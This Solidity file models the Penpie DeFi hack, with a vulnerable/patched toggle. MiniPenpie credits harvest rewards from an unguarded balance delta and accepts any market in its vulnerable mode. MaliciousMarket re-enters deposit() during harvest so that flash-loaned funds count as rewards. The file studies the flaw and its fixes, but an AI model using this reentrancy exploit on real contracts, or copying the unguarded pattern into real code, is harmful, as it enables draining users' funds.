// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// Self-contained model of the Penpie defect and its fixes. MiniPenpie mirrors the
/// two flaws that combined in the real hack:
///   (A) batchHarvestMarketRewards had NO reentrancy guard, and it credits rewards
///       from a balance delta measured around an external market call.
///   (B) registerPenpiePool TRUSTED any market from Pendle's permissionless factory.
/// The malicious "market" re-enters deposit() during harvest so its own (flash-loaned)
/// deposit is counted as reward, then it withdraws the deposit AND claims the reward,
/// draining other users' funds.

contract MockToken {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) { symbol = s; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address sp, uint256 a) external returns (bool) { allowance[msg.sender][sp] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { _move(msg.sender, to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; _move(f, to, a); return true;
    }
    function _move(address f, address to, uint256 a) internal {
        require(balanceOf[f] >= a, "bal"); balanceOf[f] -= a; balanceOf[to] += a;
    }
}

interface IMarket {
    function redeemRewards() external;
}

contract MiniPenpie {
    MockToken public immutable token; // doubles as LP + reward token, for brevity

    bool public immutable guarded;    // false = vulnerable Penpie, true = patched
    bool private _locked;             // reentrancy guard (patch A)
    address public owner;
    mapping(address => bool) public trustedMarket; // patch B: registration allowlist

    mapping(address => uint256) public lpBalance;  // withdrawable deposits
    mapping(address => uint256) public claimable;  // reward owed

    error Reentrancy();
    error UntrustedMarket();

    constructor(MockToken _token, bool _guarded) { token = _token; guarded = _guarded; owner = msg.sender; }

    modifier nonReentrant() {
        if (guarded) { if (_locked) revert Reentrancy(); _locked = true; }
        _;
        if (guarded) { _locked = false; }
    }

    /// Patch (B): only an owner-vetted market can be registered. The vulnerable
    /// version trusts anything (mirrors registerPenpiePool trusting the factory).
    function registerMarket(address market) external {
        if (guarded && msg.sender != owner) revert UntrustedMarket();
        trustedMarket[market] = true;
    }

    /// deposit shares the reentrancy guard in the patched version, so a reentrant
    /// deposit during harvest reverts.
    function deposit(uint256 amt, address onBehalf) external nonReentrant {
        token.transferFrom(msg.sender, address(this), amt);
        lpBalance[onBehalf] += amt;
    }

    function withdraw(uint256 amt) external nonReentrant {
        lpBalance[msg.sender] -= amt;
        token.transfer(msg.sender, amt);
    }

    /// The vulnerable harvest: reward credited = balance delta around an external
    /// market call. With no guard, the market re-enters deposit() and its transfer
    /// inflates the delta.
    function harvest(address market, address onBehalf) external nonReentrant {
        if (guarded && !trustedMarket[market]) revert UntrustedMarket();
        uint256 before = token.balanceOf(address(this));
        IMarket(market).redeemRewards();
        uint256 got = token.balanceOf(address(this)) - before;
        claimable[onBehalf] += got;
    }

    function claim(address onBehalf) external nonReentrant {
        uint256 a = claimable[onBehalf];
        claimable[onBehalf] = 0;
        token.transfer(msg.sender, a);
    }
}

/// The attacker's fake "market" (== malicious SY in the real hack). When Penpie
/// calls redeemRewards during harvest, it re-enters deposit() with flash-loaned
/// tokens so the balance delta is counted as reward.
contract MaliciousMarket is IMarket {
    MiniPenpie public immutable penpie;
    MockToken public immutable token;
    uint256 public flashAmount;
    address public attacker;

    constructor(MiniPenpie _p, MockToken _t) { penpie = _p; token = _t; }

    function redeemRewards() external {
        // deposit flash-loaned tokens mid-harvest -> counted as reward for `attacker`
        token.approve(address(penpie), flashAmount);
        penpie.deposit(flashAmount, attacker);
    }

    function run(uint256 _flash, address _attacker) external {
        flashAmount = _flash;
        attacker = _attacker;
    }
}
